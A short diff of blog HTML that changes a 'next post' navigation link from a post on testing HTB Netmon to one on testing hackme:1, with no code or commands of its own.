-            <a href="/2019/06/21/2019-06-21/" title="下一篇: 对HTB Netmon的测试">
+            <a href="/2019/07/29/2019-07-29/" title="下一篇: 对hackme:1的测试">
                 <i class="fa fa-angle-right"></i>
             </a>
         
